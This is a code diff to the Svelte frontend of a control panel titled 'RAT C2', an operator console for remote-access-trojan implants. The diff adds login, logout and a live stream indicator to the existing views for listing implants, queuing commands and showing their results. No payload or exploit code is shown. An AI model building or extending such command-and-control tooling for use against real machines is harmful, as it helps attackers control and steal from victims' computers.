@@ -5,12 +5,17 @@
   import ResultsPanel from './lib/ResultsPanel.svelte';
   import AuditLog     from './lib/AuditLog.svelte';
   import Dashboard    from './lib/Dashboard.svelte';
+  import Login        from './lib/Login.svelte';
 
-  let implants  = $state([]);
-  let selected  = $state(null);
-  let results   = $state([]);
-  let toasts    = $state([]);
-  let showAudit = $state(false);
+  let implants    = $state([]);
+  let selected    = $state(null);
+  let results     = $state([]);
+  let toasts      = $state([]);
+  let showAudit   = $state(false);
+  let authed      = $state(false);
+  let authChecked = $state(false);
+  let connected   = $state(false);
+  let username    = $state('');
 
   function addToast(msg, type = 'info') {
     const id = Date.now() + Math.random();
@@ -18,11 +23,35 @@
     setTimeout(() => { toasts = toasts.filter(t => t.id !== id); }, 4500);
   }
 
+  async function checkAuth() {
+    try {
+      const res = await fetch('/api/auth/status');
+      if (res.ok) {
+        const data = await res.json();
+        authed   = data.authed;
+        username = data.username ?? 'admin';
+      }
+    } catch { authed = false; }
+    authChecked = true;
+  }
+
+  async function logout() {
+    await fetch('/logout', { method: 'POST' });
+    authed   = false;
+    implants = [];
+    selected = null;
+    results  = [];
+    if (esRef) { esRef.close(); esRef = null; }
+    connected = false;
+  }
+
   async function refreshImplants() {
     try {
       const res = await fetch('/api/implants');
-      implants = await res.json();
-      if (selected) selected = implants.find(i => i.id === selected.id) ?? null;
+      if (res.ok) {
+        implants = await res.json();
+        if (selected) selected = implants.find(i => i.id === selected.id) ?? null;
+      }
     } catch { /* SSE handles reconnect */ }
   }
 
@@ -42,10 +71,15 @@
     { online: 0, idle: 0, offline: 0 }
   ));
 
-  onMount(() => {
-    refreshImplants();
+  let esRef = null;
 
+  function startSSE() {
+    if (esRef) esRef.close();
     const es = new EventSource('/api/stream');
+    esRef = es;
+
+    es.onopen = () => { connected = true; };
+    es.onerror = () => { connected = false; };
 
     es.addEventListener('implant_registered', (e) => {
       const imp = JSON.parse(e.data);
@@ -70,90 +104,111 @@
         addToast(`${data.count} result(s) from ${data.user}@${data.hostname}`, 'info');
       }
     });
+  }
 
-    es.onerror = () => { /* browser auto-reconnects */ };
-    return () => es.close();
+  onMount(async () => {
+    await checkAuth();
+    if (authed) {
+      await refreshImplants();
+      startSSE();
+    }
+    return () => { if (esRef) esRef.close(); };
   });
+
+  async function onLogin() {
+    authed = true;
+    await refreshImplants();
+    startSSE();
+  }
 </script>
 
 <div data-theme="c2dark" class="flex flex-col h-screen bg-base-100 text-base-content">
 
-  <!-- ── Navbar ──────────────────────────────────────────────────────────── -->
-  <nav class="navbar bg-base-300 border-b border-base-200 shrink-0 px-4 min-h-[48px] h-12">
-    <div class="flex-1 flex items-center gap-3">
-      <!-- Logo / title -->
-      <span class="font-bold tracking-[0.2em] text-primary text-sm select-none">
-        ◈ RAT C2
-      </span>
-      <!-- Live status pills -->
-      <div class="flex gap-1">
-        {#if counts.online  > 0}
-          <span class="badge badge-success  badge-xs">{counts.online} online</span>
-        {/if}
-        {#if counts.idle    > 0}
-          <span class="badge badge-warning  badge-xs">{counts.idle} idle</span>
-        {/if}
-        {#if counts.offline > 0}
-          <span class="badge badge-error    badge-xs">{counts.offline} offline</span>
-        {/if}
-      </div>
-    </div>
-    <div class="flex-none flex items-center gap-2 text-xs">
-      <span class="text-base-content/30">{implants.length} implant{implants.length !== 1 ? 's' : ''}</span>
-      <div class="divider divider-horizontal mx-0 h-4"></div>
-      <button class="btn btn-ghost btn-xs" onclick={() => showAudit = true}>
-        Audit Log
-      </button>
-      <button class="btn btn-ghost btn-xs" onclick={refreshImplants} title="Refresh">↺</button>
-    </div>
-  </nav>
-
-  <!-- ── Body ────────────────────────────────────────────────────────────── -->
-  <div class="flex flex-1 overflow-hidden">
-
-    <!-- Sidebar -->
-    <div class="w-64 shrink-0 border-r border-base-300 overflow-y-auto bg-base-200 flex flex-col">
-      <ImplantList
-        {implants}
-        {selected}
-        onSelect={selectImplant}
-      />
+  {#if !authChecked}
+    <!-- Loading splash -->
+    <div class="flex-1 flex items-center justify-center">
+      <span class="loading loading-spinner loading-lg text-primary"></span>
     </div>
 
-    <!-- Main content -->
-    <div class="flex flex-col flex-1 overflow-hidden">
-      {#if selected}
-        <!-- Implant workspace: command panel (top, fixed height) + results (scrolls) -->
-        <div class="flex flex-col flex-1 overflow-hidden">
-          <!-- Command panel - fixed, scrollable tabs -->
-          <div class="shrink-0 border-b border-base-300 bg-base-100">
-            <CommandPanel implant={selected} onTaskQueued={refreshImplants} />
-          </div>
-          <!-- Results panel - takes remaining space -->
-          <div class="flex-1 overflow-hidden">
-            <ResultsPanel {results} implant={selected} />
-          </div>
+  {:else if !authed}
+    <Login {onLogin} />
+
+  {:else}
+    <!-- ── Navbar ──────────────────────────────────────────────────────────── -->
+    <nav class="navbar bg-base-300 shrink-0 px-4 min-h-[48px] h-12"
+         style="border-bottom: 1px solid rgba(0,229,176,0.15)">
+      <div class="flex-1 flex items-center gap-3">
+        <span class="font-bold tracking-[0.2em] text-primary text-sm select-none"
+              style="text-shadow: 0 0 12px rgba(0,229,176,0.4)">◈ RAT C2</span>
+        <div class="flex gap-1">
+          {#if counts.online  > 0}
+            <span class="badge badge-success  badge-xs">{counts.online} online</span>
+          {/if}
+          {#if counts.idle    > 0}
+            <span class="badge badge-warning  badge-xs">{counts.idle} idle</span>
+          {/if}
+          {#if counts.offline > 0}
+            <span class="badge badge-error    badge-xs">{counts.offline} offline</span>
+          {/if}
         </div>
-      {:else}
-        <!-- Dashboard when nothing selected -->
-        <Dashboard {implants} />
-      {/if}
+      </div>
+      <div class="flex-none flex items-center gap-2 text-xs">
+        <!-- SSE connection indicator -->
+        <div class="flex items-center gap-1.5" title={connected ? 'Stream connected' : 'Stream disconnected'}>
+          <span class="w-1.5 h-1.5 rounded-full {connected ? 'bg-success animate-pulse' : 'bg-error'}"
+                style={connected ? 'box-shadow: 0 0 6px #3fb950' : ''}></span>
+          <span class="text-base-content/30 hidden sm:inline">{connected ? 'live' : 'offline'}</span>
+        </div>
+        <div class="divider divider-horizontal mx-0 h-4"></div>
+        <span class="text-base-content/30">{implants.length} implant{implants.length !== 1 ? 's' : ''}</span>
+        <div class="divider divider-horizontal mx-0 h-4"></div>
+        <button class="btn btn-ghost btn-xs" onclick={() => showAudit = true}>Audit Log</button>
+        <button class="btn btn-ghost btn-xs" onclick={refreshImplants} title="Refresh">↺</button>
+        <div class="divider divider-horizontal mx-0 h-4"></div>
+        <div class="dropdown dropdown-end">
+          <button tabindex="0" class="btn btn-ghost btn-xs gap-1">
+            <span class="text-primary">◉</span>
+            <span class="font-mono">{username}</span>
+          </button>
+          <ul tabindex="0" class="dropdown-content menu menu-sm bg-base-300 rounded-box z-50 w-36 p-1 shadow border border-base-200 mt-1">
+            <li><button onclick={logout} class="text-error hover:bg-error/10">Logout</button></li>
+          </ul>
+        </div>
+      </div>
+    </nav>
+
+    <!-- ── Body ──────────────────────────────────────────────────────────────── -->
+    <div class="flex flex-1 overflow-hidden">
+      <div class="w-64 shrink-0 border-r border-base-300 overflow-y-auto bg-base-200 flex flex-col">
+        <ImplantList {implants} {selected} onSelect={selectImplant} />
+      </div>
+      <div class="flex flex-col flex-1 overflow-hidden">
+        {#if selected}
+          <div class="flex flex-col flex-1 overflow-hidden">
+            <div class="shrink-0 border-b border-base-300 bg-base-100">
+              <CommandPanel implant={selected} onTaskQueued={refreshImplants} />
+            </div>
+            <div class="flex-1 overflow-hidden">
+              <ResultsPanel {results} implant={selected} />
+            </div>
+          </div>
+        {:else}
+          <Dashboard {implants} onSelectImplant={selectImplant} />
+        {/if}
+      </div>
     </div>
 
-  </div>
+    <!-- ── Toasts ─────────────────────────────────────────────────────────────── -->
+    <div class="toast toast-end toast-bottom z-50 max-w-xs">
+      {#each toasts as t (t.id)}
+        <div class="alert alert-{t.type} shadow-lg text-xs py-2 px-4 gap-2">
+          <span>{t.msg}</span>
+        </div>
+      {/each}
+    </div>
 
-  <!-- ── Toasts ───────────────────────────────────────────────────────────── -->
-  <div class="toast toast-end toast-bottom z-50 max-w-xs">
-    {#each toasts as t (t.id)}
-      <div class="alert alert-{t.type} shadow-lg text-xs py-2 px-4 gap-2">
-        <span>{t.msg}</span>
-      </div>
-    {/each}
-  </div>
-
-  <!-- ── Audit log modal ──────────────────────────────────────────────────── -->
-  {#if showAudit}
-    <AuditLog onClose={() => showAudit = false} />
+    {#if showAudit}
+      <AuditLog onClose={() => showAudit = false} />
+    {/if}
   {/if}
-
 </div>
